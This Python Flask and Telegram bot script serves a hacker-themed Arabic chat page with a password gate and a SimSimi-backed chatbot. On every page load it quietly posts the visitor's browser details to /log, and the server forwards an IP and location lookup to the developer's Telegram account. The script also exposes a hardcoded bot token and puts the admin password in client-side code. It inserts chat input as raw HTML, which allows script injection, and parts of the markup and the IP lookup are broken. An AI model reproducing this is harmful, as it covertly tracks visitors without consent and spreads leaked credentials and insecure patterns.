import telebot, os, requests
from flask import Flask, render_template_string, request, jsonify

# --- [ إعدادات المطور Muhammad ] ---
BOT_TOKEN = "6785445743:AAFquuyfY2IIjgs2x6PnL61uA-3apHIpz2k"
MY_ID = "6190753066"
ADMIN_PASS = "hx2026"
INSTA_URL = "https://instagram.com/kail.911"

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

def get_ai_response(text):
    try:
        # اتصال سريع جداً
        res = requests.get(f"https://api.simsimi.net/v2/?text={text}&lc=ar", timeout=3)
        return res.json().get('success', "تم استلام الأمر بنجاح.")
    except:
        return "جاري المعالجة..."

HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>MUHAMMAD SYSTEM</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
        body { margin:0; background:#000; color:#00ffcc; font-family: sans-serif; overflow:hidden; height:100vh; }
        
        .header { position:fixed; top:0; width:100%; height:60px; display:flex; justify-content:space-between; align-items:center; padding:0 15px; background:rgba(0,0,0,0.9); z-index:1000; border-bottom:1px solid #00ffcc33; box-sizing:border-box; }
        .insta { color:#00ffcc; border:1px solid #00ffcc; padding:4px 10px; border-radius:15px; text-decoration:none; font-size:11px; }
        
        #main-dashboard { display:none; flex-direction:row; height:100vh; padding-top:60px; gap:10px; box-sizing:border-box; padding:70px 10px 10px 10px; }
        
        /* ضبط الموبايل (أهم جزء) */
        @media (max-width:800px) {
            #main-dashboard { flex-direction:column; overflow-y:auto; display:none; }
            .map-box { height:200px !important; min-height:200px; order:1; }
            .chat-box { height:calc(100vh - 300px) !important; order:2; flex:none; }
            .m { font-size:15px !important; } /* تكبير الخط للردود */
        }
        
        .map-box { flex:1.2; border:1px solid #00ffcc22; border-radius:12px; overflow:hidden; background:#050505; }
        .chat-box { flex:1; background:#0a0a0a; border-radius:20px; border:1px solid #00ffcc33; display:flex; flex-direction:column; overflow:hidden; position:relative; }
        
        .messages { flex:1; padding:15px; overflow-y:auto; display:flex; flex-direction:column; gap:12px; padding-bottom:70px; }
        .m { padding:12px 18px; border-radius:18px; font-size:14px; max-width:85%; line-height:1.5; word-wrap:break-word; }
        .user { background:#00ffcc; color:#000; align-self:flex-start; font-weight:bold; box-shadow: 0 4px 10px rgba(0,255,204,0.2); }
        .bot { background:#1a1a1a; border:1px solid #00ffcc44; color:#fff; align-self:flex-end; }
        
        .input-area { position:absolute; bottom:0; width:100%; background:#050505; padding:12px; border-top:1px solid #1a1a1a; display:flex; gap:8px; box-sizing:border-box; }
        input { flex:1; background:#000; border:1px solid #00ffcc66; color:#00ffcc; padding:12px; border-radius:25px; outline:none; font-size:14px; }
        
        #login { height:100vh; display:flex; flex-direction:column; justify-content:center; align-items:center; background:#000; }
        .login-btn { margin-top:20px; background:#00ffcc; color:#000; border:none; padding:12px 60px; font-weight:bold; cursor:pointer; border-radius:30px; }
    </style>
</head>
<body onload="capture()">
    <div class="header">
        <a href="{{ insta }}" target="_blank" class="insta">@kail.911</a>
        <div style="font-size:11px; font-weight:bold; text-shadow:0 0 5px #00ffcc;">MUHAMMAD DEV</div>
    </div>

    <div id="login">
        <h2 style="letter-spacing:4px; color:#00ffcc;">SYSTEM ACCESS</h2>
        <input type="password" id="pass" placeholder="PASSWORD" style="width:250px; padding:15px; border:1px solid #00ffcc; background:none; color:#00ffcc; text-align:center; border-radius:10px;">
        <button onclick="login()" class="login-btn">ENTER SYSTEM</button>
        <div id="main-dashboard">
        <div class="map-box">
            <iframe src="https://cybermap.kaspersky.com/en/widget/map" style="width:100%; height:100%; border:none; filter:hue-rotate(150deg);"></iframe>
        </div>
        <div class="chat-box">
            <div class="messages" id="ms">
                <div class="m bot">مرحباً سيدي .معك الرد التلقائي الغير مقيد من المبرمج محمد. اسألني أي شيء.</div>
            </div>
            <div class="input-area">
                <input type="text" id="in" placeholder="اكتب رسالتك..." onkeypress="if(event.which==13)send()">
            </div>
        </div>
    </div>

    <script>
        function capture() {
            fetch('/log', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({ua:navigator.userAgent}) });
        }
        function login() {
            if($("#pass").val() === "{{ pass }}") { 
                $("#login").hide(); 
                $("#main-dashboard").css("display","flex"); 
            } else { alert("ACCESS DENIED"); }
        }
        function send() {
            let t = $("#in").val(); if(!t) return;
            $("#ms").append(`<div class="m user">${t}</div>`); $("#in").val("");
            $("#ms").scrollTop($("#ms")[0].scrollHeight);
            $.ajax({
                url:'/ai', method:'POST', contentType:'application/json', data:JSON.stringify({t:t}),
                success: function(d) {
                    $("#ms").append(`<div class="m bot">${d.r}</div>`);
                    $("#ms").scrollTop($("#ms")[0].scrollHeight);
                }
            });
        }
    </script>
</body>
</html>
"""

@app.route("/")
def index(): return render_template_string(HTML, pass=ADMIN_PASS, insta=INSTA_URL)

@app.route("/log", methods=['POST'])
def log():
    try:
        g = requests.get('http://ip-api.com/json/', timeout=3).json()
        bot.send_message(MY_ID, f"🚀 **دخول جديد**\\n🌐 IP: `{g.get('query')}`\\n📍 الموقع: {g.get('country')}\\n📱 الجهاز: `{request.json.get('ua')[:40]}...`")
    except: pass
    return jsonify(ok=True)

@app.route("/ai", methods=['POST'])
def ai():
    return jsonify(r=get_ai_response(request.json.get('t')))

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
    </div>
